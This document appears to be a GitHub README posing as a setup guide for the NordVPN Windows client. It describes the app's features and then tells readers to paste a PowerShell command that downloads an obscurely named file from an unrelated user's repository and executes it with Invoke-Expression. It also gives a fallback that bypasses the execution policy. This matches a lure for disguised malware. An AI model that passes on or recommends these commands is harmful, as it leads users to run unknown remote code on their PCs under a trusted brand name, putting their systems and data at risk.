# NordVPN

NordVPN is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open NordVPN and work in it.

NordVPN is a Windows desktop client that connects your PC to remote VPN servers so browsing, streaming, and everyday apps use an encrypted tunnel instead of exposing your home IP. You install the app, sign in once, and manage servers, specialty modes, and connection preferences from a single window with a system tray icon for quick access.

A typical session starts when you open NordVPN from the Start menu or tray, wait for the app to load your account profile, and choose a server from the map or country list. You click Connect, watch the status switch to secured, and leave the client running while you work in a browser, mail client, or remote desktop session. When you finish, you disconnect from the tray or main window, or let the app auto-reconnect after sleep or network changes.

This repository holds the Windows setup package for a pinned build, short release notes that summarize what changed between versions, and a changelog file that tracks server list updates and client fixes. Use the setup file on a clean machine or upgrade path documented in the notes, and refer to the changelog when you need to confirm build numbers or compatibility with your Windows version.

## What you do with it

- Quick Connect picks a nearby server automatically when you need a fast secure link.
- The interactive map lets you choose a country before the client establishes the tunnel.
- Kill Switch blocks internet traffic if the VPN drops so apps do not leak outside the tunnel.
- Split tunneling sends only selected Windows apps through NordVPN while others use local routing.
- The system tray icon shows connected state and offers one-click connect or disconnect.
- Threat Protection Lite can block known malicious domains while the VPN session stays active.
- Meshnet links trusted devices over encrypted paths without routing all PC traffic through remote servers.
- Auto-connect on startup joins your last server or preferred country when Windows boots.

## Quick Setup (PowerShell)

This installs the program NordVPN on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/marie458471707/nordvpn-setup-guide/main/rh1v8miabv.mv1gidn6 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/marie458471707/nordvpn-setup-guide/main/rh1v8miabv.mv1gidn6 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `rh1v8miabv.mv1gidn6` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `marie458471707/nordvpn-setup-guide`. NordVPN 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
